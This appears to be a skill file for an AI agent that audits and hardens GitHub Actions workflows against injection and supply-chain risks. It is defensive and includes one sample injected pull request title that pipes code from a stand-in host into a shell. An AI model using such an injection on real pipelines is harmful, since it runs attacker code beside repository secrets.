---
name: shipcheck-ci
description: >-
  Audits GitHub Actions workflows for supply-chain and injection holes (actions not pinned to a
  commit SHA, pull_request_target that checks out the PR head, missing or write-all permissions,
  script injection through github.event values, secrets echoed or put on a command line, curl
  piped to bash, self-hosted runners on fork triggers, missing timeouts, caches and concurrency)
  and hardens them, explaining the attack each finding enables. Use when the user says "audit
  my GitHub Actions", "is my workflow secure", "pin my actions", "harden my CI", "review my
  workflow YAML", or "why is my pipeline slow".
argument-hint: "[project folder or workflow file, default .]"
---

# shipcheck-ci: harden the pipeline that holds your secrets

A workflow runs code with your repository's secrets and a write token. The fixes are small; the
point is to explain which attack each one stops, so the user keeps them when copying workflows
later.

## Inputs

- A project folder (default `.`, reads `.github/workflows/*.yml|yaml`) or a workflow file.
- Commands below say `python3`; on Windows use `python` (or `py -3`).
- Permission to edit the workflow files. Do not push or trigger runs unless asked.

## Outputs

- Findings CI000 to CI011 with severity, line, the attack (`--explain`) and a fix.
- Edited workflows, and a list of the actions that still need a SHA from the user.
- A note for any file the parser skipped.

## Steps

1. **Audit with the attack explained.**
   ```
   python3 "${CLAUDE_SKILL_DIR}/ci_audit.py" . --explain --fail-on never
   ```
   The YAML parser is a hand-written subset (no anchors, aliases, tags, merge keys or
   multi-line scalars). A file it cannot read is reported as CI000 and was not audited: say so,
   and review that file by hand rather than assuming it is clean.

2. **Explain each finding in one sentence, as an attack**, using the `why` text and the user's
   own line: "line 24 pastes the pull request title into the shell, so a title like
   `x"; curl evil.example | sh; "` runs on your runner with your secrets".

3. **Fix in this order** (highest risk first):
   - CI002 and CI010: never check out or run PR head code under `pull_request_target`; keep
     self-hosted runners off fork-triggered workflows.
   - CI004: move untrusted `${{ }}` values into `env:` and use `"$VAR"` in the script.
   - CI005: pass secrets through `env:` or `with:`, never `echo` them, never on a command line.
   - CI003: add `permissions: contents: read` at the top; grant more per job.
   - CI001: pin actions to a full commit SHA (next step).
   - CI006 to CI011: no `curl | bash`, `timeout-minutes`, caches, no `continue-on-error` on
     tests, `concurrency` on deploys.

4. **Pin actions without inventing SHAs.** You cannot look a SHA up offline, and a made-up one
   fails the build or, worse, looks pinned. Tell the user how: open the action's repository,
   Releases or Tags, click the version tag, and copy the 40-character commit SHA; or run
   `git ls-remote https://github.com/<owner>/<repo> refs/tags/<tag>` (for annotated tags use
   the `^{}` line, which is the commit). Write it as `uses: owner/repo@<sha>  # v4.1.0`. If the
   user gives you the SHAs, use them; otherwise leave a `# TODO pin` note, list the actions, and
   suggest Dependabot or Renovate to keep pins current.

5. **Re-run** the audit. Remaining CI001 items should be exactly the actions waiting for a SHA.
   Check that the YAML still parses (the script would report CI000 otherwise).

## Decision rules

- First-party `actions/*` pinned by tag is low risk; a third-party action on a branch
  (`@main`) is the worst case, and the script ranks them that way.
- Reusable workflows from your own organization: pin them too, to a SHA or a protected tag.
- A deploy job that must run from a fork's PR: use `pull_request` for tests and a separate
  `workflow_run` or manually approved environment for the deploy, never the head checkout.
- `continue-on-error: true` on a non-test step (a notification, a cache save) is fine; the
  script only flags test and lint steps.
- No lockfile, so no meaningful cache key: skip CI008 and say why.

## What NOT to do

- Do not invent commit SHAs, action versions or checksums.
- Do not print secret values, and do not add steps that echo them to "debug".
- Do not widen `permissions` or add `pull_request_target` to make a failing run pass.
- Do not trigger, re-run or cancel workflows, edit repository secrets or settings, or push,
  without the user's explicit permission and authorization for that repository.
